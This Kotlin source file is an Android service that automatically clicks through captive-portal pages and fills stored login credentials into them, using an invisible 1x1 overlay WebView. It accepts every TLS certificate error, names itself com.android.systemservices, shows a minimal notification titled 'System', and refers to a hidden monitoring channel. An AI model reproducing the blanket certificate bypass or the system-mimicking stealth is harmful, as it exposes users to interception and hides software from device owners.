package com.android.systemservices

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.PixelFormat
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.net.http.SslError
import android.webkit.CookieManager
import android.webkit.SslErrorHandler
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONObject

/**
 * LAST-RESORT captive-portal solver for JavaScript-driven splash pages (ExtremeGuest, Meraki, and
 * other SPA/XHR "Accept & Connect" portals) that the headless raw-HTTP solver in [CaptivePortalHelper]
 * cannot drive. A real browser engine runs the page's own JS (which builds the accept request),
 * and we just click the Accept/Continue control.
 *
 * Runs in a SEPARATE process (`:captive`, set in the manifest) for one critical reason: it calls
 * [ConnectivityManager.bindProcessToNetwork] to pin THIS process to the captive WiFi — and because
 * it's a different process, that binding does NOT drag the main MonitoringService process (which
 * carries the REALITY-over-cellular control channel) onto the captive network. Gemini correctly
 * flagged that a same-process WebView would sever the control channel; the separate process is the fix.
 *
 * The WebView is hosted in an invisible 1x1 TYPE_APPLICATION_OVERLAY window so it has a real window
 * token (off-screen Service WebViews without a window get their JS timers throttled), while staying
 * invisible to the user.
 *
 * ⚠️ Binding caveat: bindProcessToNetwork binds this process; WebView's renderer is a separate sandbox
 * process and may not inherit the binding on every Android build. For CLOUD-hosted portals that
 * authorize by MAC (like ExtremeGuest) the accept still tends to work; for strictly local-NAS portals
 * it may not. This is best-effort — the headless path and "needs manual login" fallback remain.
 */
class CaptivePortalWebViewService : Service() {
    companion object {
        private const val TAG = "CaptivePortalWV"
        private const val CHANNEL = "sentinel_sys"
        private const val NOTIF_ID = 0xCA9
        private const val EXTRA_NETWORK = "net"
        private const val EXTRA_URL = "url"
        private const val EXTRA_CREDS = "creds"    // lowercased-key credential JSON (optional → credential mode)
        private const val EXTRA_HINTS = "hints"    // field-name → cred-key hint JSON (optional)
        private const val MAX_MS = 35_000L
        private const val MAX_MS_CREDS = 75_000L   // credential mode: satellite-link SPA + multi-step SSO (Starlink etc.)
        @Volatile private var dataDirSet = false

        /**
         * Start the WebView solve for [url] over [network]. Fire-and-forget — the caller polls the
         * network for a clear (the service calls reportNetworkConnectivity on success).
         *
         * Accept mode (credsJson == null): click the Accept/Continue control.
         * Credential mode (credsJson != null): fill the login inputs of JS/SPA portals that have no
         * static <form> (unitedwifi.com, Delta Sync Wi-Fi, …), then click the login control. Both
         * [credsJson] and [hintsJson] are JSON strings; cred keys are expected lowercased.
         */
        fun start(context: Context, network: Network, url: String,
                  credsJson: String? = null, hintsJson: String? = null) {
            try {
                val i = Intent(context, CaptivePortalWebViewService::class.java)
                    .putExtra(EXTRA_NETWORK, network)
                    .putExtra(EXTRA_URL, url)
                if (credsJson != null) {
                    i.putExtra(EXTRA_CREDS, credsJson)
                    if (hintsJson != null) i.putExtra(EXTRA_HINTS, hintsJson)
                }
                context.startForegroundService(i)
            } catch (t: Throwable) { Log.w(TAG, "start failed: ${t.message}") }
        }
    }

    private val main = Handler(Looper.getMainLooper())
    private var webView: WebView? = null
    private var windowManager: WindowManager? = null
    @Volatile private var done = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNotif()
        val network: Network? = parcelableNetwork(intent)
        val url = intent?.getStringExtra(EXTRA_URL)
        val credsJson = intent?.getStringExtra(EXTRA_CREDS)
        val hintsJson = intent?.getStringExtra(EXTRA_HINTS)
        if (network == null || url.isNullOrBlank()) { stop(); return START_NOT_STICKY }
        try { run(network, url, credsJson, hintsJson) } catch (t: Throwable) { Log.w(TAG, "run failed: ${t.message}"); stop() }
        return START_NOT_STICKY
    }

    @Suppress("DEPRECATION")
    private fun parcelableNetwork(intent: Intent?): Network? = try {
        if (Build.VERSION.SDK_INT >= 33) intent?.getParcelableExtra(EXTRA_NETWORK, Network::class.java)
        else intent?.getParcelableExtra(EXTRA_NETWORK)
    } catch (_: Throwable) { null }

    private fun run(network: Network, url: String, credsJson: String?, hintsJson: String?) {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        try { cm.bindProcessToNetwork(network) } catch (t: Throwable) { Log.w(TAG, "bind failed: ${t.message}") }
        val credMode = credsJson != null
        if (credMode) Log.i(TAG, "solving via WebView (credential mode) on bound WiFi → ${url.take(140)}")
        else Log.i(TAG, "solving via WebView on bound WiFi → ${url.take(140)}")

        main.post { startWebView(url, credsJson, hintsJson) }

        // Poll for the network to actually clear; stop on success or timeout. The WebView's JS click
        // drives the portal's own accept/login flow; Android validates once real traffic flows.
        Thread {
            val deadline = System.currentTimeMillis() + (if (credMode) MAX_MS_CREDS else MAX_MS)
            var cleared = false
            while (System.currentTimeMillis() < deadline && !done) {
                try { Thread.sleep(2500) } catch (_: InterruptedException) {}
                if (CaptivePortalHelper.probeClear(network)) { cleared = true; break }
            }
            if (cleared) {
                Log.i(TAG, "WebView solve CLEARED the portal")
                try { AirlineWifiHelper.reportCleared(this, network) } catch (_: Throwable) {}
            } else {
                Log.i(TAG, "WebView solve did not clear within ${if (credMode) MAX_MS_CREDS else MAX_MS}ms")
            }
            stop()
        }.start()
    }

    private fun startWebView(url: String, credsJson: String?, hintsJson: String?) {
        if (done) return
        try {
            // Distinct data-dir suffix: WebView forbids two processes sharing the default dir.
            if (!dataDirSet) {
                if (Build.VERSION.SDK_INT >= 28) { try { WebView.setDataDirectorySuffix("captive") } catch (_: Throwable) {} }
                dataDirSet = true
            }
            val wv = WebView(this)
            webView = wv
            wv.settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                @Suppress("DEPRECATION") databaseEnabled = true
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW   // portals mix http subresources
                cacheMode = WebSettings.LOAD_NO_CACHE
                userAgentString = "Mozilla/5.0 (Linux; Android 14; Pixel) AppleWebKit/537.36 " +
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            }
            try {
                val cm = CookieManager.getInstance()
                cm.setAcceptCookie(true)
                cm.setAcceptThirdPartyCookies(wv, true)   // Ping/Federate SSO iframes
            } catch (_: Throwable) {}
            wv.webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView, u: String?) {
                    Log.i(TAG, "page finished: ${u?.take(120)}")
                    if (credsJson != null) {
                        fillGen++   // restart the fill loop for the new page (redirects / next step)
                        fillCreds(view, 0, credsJson, hintsJson)
                    } else clickAccept(view, 0)
                }
                // Inflight portals MITM HTTPS with a self-signed / hostname-mismatch cert.
                // Without this the SPA never loads and credential fill never runs.
                override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
                    Log.i(TAG, "ssl error (proceeding — captive portal): ${error?.primaryError}")
                    handler?.proceed()
                }
            }
            // Invisible 1x1 overlay → real window token (reliable JS) without being visible.
            try {
                val type = if (Build.VERSION.SDK_INT >= 26) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                           else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                val lp = WindowManager.LayoutParams(
                    1, 1, type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                    PixelFormat.TRANSPARENT
                ).apply { gravity = Gravity.TOP or Gravity.START }
                val w = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                windowManager = w
                w.addView(wv, lp)
            } catch (t: Throwable) {
                Log.w(TAG, "overlay add failed (${t.message}) — JS may be throttled")
            }
            wv.loadUrl(url)
        } catch (t: Throwable) {
            Log.w(TAG, "WebView init failed: ${t.message}")
        }
    }

    /** Click the first Accept/Continue/Connect control; retry a few times since the portal's JS often
     *  wires the handler (or fills an empty href) after page load. */
    private fun clickAccept(view: WebView, attempt: Int) {
        if (done || attempt > 6) return
        val js = """
            (function(){
              var kw=/accept|agree|continue|connect|proceed|get ?online|i ?agree|enter|start|log ?in/i;
              var els=document.querySelectorAll('a,button,input[type=submit],input[type=button],.ancButton,.btn');
              for(var i=0;i<els.length;i++){
                var e=els[i];
                var t=((e.innerText||e.textContent||e.value||'')+' '+(e.className||''));
                if(kw.test(t)){ try{e.click();}catch(x){} return 'clicked:'+t.replace(/\s+/g,' ').slice(0,48); }
              }
              return 'no-accept-control';
            })();
        """.trimIndent()
        try { view.evaluateJavascript(js) { r -> Log.i(TAG, "accept-click[$attempt]: $r") } } catch (_: Throwable) {}
        main.postDelayed({ clickAccept(view, attempt + 1) }, 2500)
    }

    // Credential-mode fill loop. A generation counter restarts the loop on every page finish
    // (redirects), so overlapping loops from earlier pages stop themselves.
    @Volatile private var fillGen = 0

    /** Fill the login inputs of a JS/SPA portal and click its login control. Runs every 2.5s up to
     *  ~35s: SPA frameworks render inputs asynchronously, and multi-step flows (account → password)
     *  need a fresh fill+click per step. Fills are idempotent (already-filled inputs are skipped)
     *  and the click flag re-arms whenever a NEW empty input gets filled, so a second step's click
     *  still fires — without double-submitting the same step. */
    private fun fillCreds(view: WebView, attempt: Int, credsJson: String, hintsJson: String?) {
        val gen = fillGen
        if (done || attempt >= 24 || gen != fillGen) return
        val js = credentialFillJs(credsJson, hintsJson)
        try { view.evaluateJavascript(js) { r -> Log.i(TAG, "cred-fill[$attempt]: $r") } } catch (_: Throwable) {}
        main.postDelayed({ fillCreds(view, attempt + 1, credsJson, hintsJson) }, 2500)
    }

    /** JS snippet: fill credential inputs (React-safe native value setter + input/change events),
     *  click the login control, or click a "log in" link to open the login view when no inputs exist
     *  yet. Credential JSON keys are lowercased by the caller; hints map field names to cred keys. */
    private fun credentialFillJs(credsJson: String, hintsJson: String?): String {
        val credsLit = JSONObject.quote(credsJson)                  // valid JS string literal
        val hintsLit = if (hintsJson != null) JSONObject.quote(hintsJson) else "{}"
        return """
            (function(){
              var creds = JSON.parse($credsLit);
              var hints = JSON.parse($hintsLit);
              function setVal(el, v) {
                if (el.value === v) return false;
                try {
                  var proto = el instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
                  var setter = Object.getOwnPropertyDescriptor(proto, 'value').set;
                  setter.call(el, v);
                  el.dispatchEvent(new Event('input', {bubbles:true}));
                  el.dispatchEvent(new Event('change', {bubbles:true}));
                } catch(e) {}
                window.__sentinelClicked = false;
                return true;
              }
              function lookup(raw) {
                var l = (raw||'').toLowerCase().replace(/[^a-z0-9]+/g,'');
                if (!l) return null;
                if (creds[l] !== undefined && creds[l] !== '') return creds[l];
                for (var k in creds) {
                  if (!creds[k]) continue;
                  var ck = k.toLowerCase().replace(/[^a-z0-9]+/g,'');
                  if (ck && (l.indexOf(ck) >= 0 || ck.indexOf(l) >= 0)) return creds[k];
                }
                var ks = hints[(raw||'').toLowerCase()] || hints[l];
                if (ks) for (var i=0;i<ks.length;i++) {
                  var c = creds[(ks[i]||'').toLowerCase()];
                  if (c !== undefined && c !== '') return c;
                }
                return null;
              }
              function credKeyFor(el) {
                var attrs = [el.name, el.id, el.getAttribute('autocomplete'),
                             el.getAttribute('aria-label'), el.getAttribute('placeholder'),
                             el.getAttribute('data-testid')];
                for (var i=0;i<attrs.length;i++) {
                  var v = lookup(attrs[i]);
                  if (v !== null) return v;
                }
                var t = (el.type||'text').toLowerCase();
                if (t === 'email' && creds['email']) return creds['email'];
                if (t === 'password' && creds['password']) return creds['password'];
                return null;
              }
              var inputs = document.querySelectorAll('input');
              var textLike = [], pw = [];
              for (var i=0;i<inputs.length;i++) {
                var t = (inputs[i].type||'text').toLowerCase();
                if (t === 'password') pw.push(inputs[i]);
                else if (['text','email','tel','number',''].indexOf(t) >= 0) textLike.push(inputs[i]);
              }
              var filled = 0;
              for (var i=0;i<inputs.length;i++) {
                var el = inputs[i];
                var t = (el.type||'text').toLowerCase();
                if (t==='submit'||t==='button'||t==='hidden'||t==='checkbox'||t==='radio'||t==='image'||t==='reset') continue;
                var v = credKeyFor(el);
                if (v !== null) { if (setVal(el, v)) filled++; }
              }
              if (filled === 0 && textLike.length === 1 && pw.length === 1) {
                var u = null;
                for (var k in creds) { if (k !== 'password' && creds[k]) { u = creds[k]; break; } }
                if (u && setVal(textLike[0], u)) filled++;
                if (creds['password'] && setVal(pw[0], creds['password'])) filled++;
              }
              if (filled > 0 && !window.__sentinelClicked) {
                var kw = /log ?in|sign ?in|connect|continue|submit|get online|enter|authorize/i;
                var btns = document.querySelectorAll('button,input[type=submit]');
                if (btns.length === 0) btns = document.querySelectorAll('a');
                for (var i=0;i<btns.length;i++) {
                  var b = btns[i];
                  var t = ((b.innerText||b.textContent||b.value||'')+'');
                  if (kw.test(t)) { try{b.click();}catch(e){} window.__sentinelClicked = true; return 'filled=' + filled + ' clicked:' + t.replace(/\s+/g,' ').slice(0,40); }
                }
                return 'filled=' + filled + ' no-button';
              }
              if (filled === 0) {
                var kw2 = /log ?in|sign ?in|connect|continue|get ?online|get ?started|start|enter|agree|accept|proceed|skymiles|mileageplus|aadvantage|rapid rewards|frequent flyer|member log ?in|i have an account/i;
                var links = document.querySelectorAll('a,button');
                var last = window.__sentinelLastClick || '';
                for (var i=0;i<links.length;i++) {
                  var a = links[i];
                  var t = ((a.innerText||a.textContent||'')+'');
                  if (kw2.test(t) && t !== last) {
                    try{a.click();}catch(e){}
                    window.__sentinelLastClick = t;   // don't re-click the same control next pass
                    return 'login-link:' + t.replace(/\s+/g,' ').slice(0,40);
                  }
                }
                return 'no-inputs';
              }
              return 'filled=' + filled + ' wait';
            })();
        """.trimIndent()
    }

    private fun startForegroundNotif() {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(NotificationChannel(CHANNEL, "System", NotificationManager.IMPORTANCE_MIN))
            }
            val n: Notification = if (Build.VERSION.SDK_INT >= 26)
                Notification.Builder(this, CHANNEL).setContentTitle("System").setSmallIcon(android.R.drawable.stat_sys_download).build()
            else @Suppress("DEPRECATION") Notification.Builder(this).setSmallIcon(android.R.drawable.stat_sys_download).build()
            if (Build.VERSION.SDK_INT >= 29) startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            else startForeground(NOTIF_ID, n)
        } catch (t: Throwable) { Log.w(TAG, "fg notif failed: ${t.message}") }
    }

    private fun stop() {
        if (done) return
        done = true
        main.post {
            try { webView?.let { wv -> windowManager?.removeView(wv); wv.destroy() } } catch (_: Throwable) {}
            webView = null
        }
        try { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).bindProcessToNetwork(null) } catch (_: Throwable) {}
        try { stopForeground(STOP_FOREGROUND_REMOVE) } catch (_: Throwable) {}
        stopSelf()
    }

    override fun onDestroy() { stop(); super.onDestroy() }
}
